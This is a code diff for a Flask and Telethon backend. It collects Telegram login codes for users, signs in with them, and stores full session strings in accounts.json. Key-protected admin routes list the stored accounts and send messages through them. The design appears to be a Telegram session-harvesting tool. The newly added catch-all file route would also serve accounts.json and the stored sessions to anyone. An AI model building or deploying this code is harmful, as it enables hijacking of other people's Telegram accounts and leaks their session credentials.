@@ -7,12 +7,11 @@ import os
 
 app = Flask(__name__, static_folder='.')
 
-# ⚙️ CONFIG — Railway .env এ সেট করবে
+# ⚙️ CONFIG
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
 SECRET_KEY = os.getenv('SECRET_KEY', 'your_admin_key_here')
 
-# 🗃️ Accounts Database (Replace with SQLite/Redis later)
 ACCOUNTS_FILE = 'accounts.json'
 if not os.path.exists(ACCOUNTS_FILE):
     with open(ACCOUNTS_FILE, 'w') as f:
@@ -31,19 +30,13 @@ def save_accounts(data):
 def request_otp():
     data = request.json
     user_id = str(data['user_id'])
-
-    # Here you should ask user for phone number via WebApp popup or form
-    # For demo, we assume you have a way to get phone number (e.g., from DB or manual input)
-    # In real app, use WebApp.requestContact() or show input field
-
-    phone = "+8801XXXXXXXX"  # ⚠️ REPLACE: Get from user via UI or DB mapping
+    phone = "+8801XXXXXXXX"  # ⚠️ REPLACE WITH REAL INPUT LATER
 
     async def send_code():
         client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
         await client.connect()
         if not await client.is_user_authorized():
             result = await client.send_code_request(phone)
-            # Save phone & hash for verification
             accounts = load_accounts()
             accounts[user_id] = {
                 "phone": phone,
@@ -80,7 +73,6 @@ def verify_otp():
         await client.connect()
         try:
             await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
-            # Save session string
             string = StringSession.save(client.session)
             accounts[user_id]["session_string"] = string
             accounts[user_id]["status"] = "active"
@@ -97,7 +89,7 @@ def verify_otp():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
-# 👑 Admin Panel Route (Protected)
+# 👑 Admin Panel
 @app.route('/admin')
 def admin_panel():
     key = request.args.get('key')
@@ -105,7 +97,7 @@ def admin_panel():
         return "❌ Access Denied", 403
     return send_from_directory('.', 'admin.html')
 
-# 📡 Get All Accounts (for Admin Panel API)
+# 📡 Get All Accounts
 @app.route('/api/accounts')
 def api_accounts():
     key = request.args.get('key')
@@ -113,7 +105,7 @@ def api_accounts():
         return jsonify([]), 403
     return jsonify(load_accounts())
 
-# 📩 Send Message API (Example)
+# 📩 Send Message API
 @app.route('/api/send_message', methods=['POST'])
 def api_send_message():
     key = request.args.get('key')
@@ -144,6 +136,18 @@ def api_send_message():
         return jsonify({"success": sent})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+# ✅ SERVE FRONTEND FILES
+@app.route('/')
+def home():
+    return send_from_directory('.', 'index.html')
+
+@app.route('/<path:path>')
+def static_files(path):
+    if os.path.exists(path):
+        return send_from_directory('.', path)
+    else:
+        return send_from_directory('.', 'index.html')  # Fallback for SPA
 
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
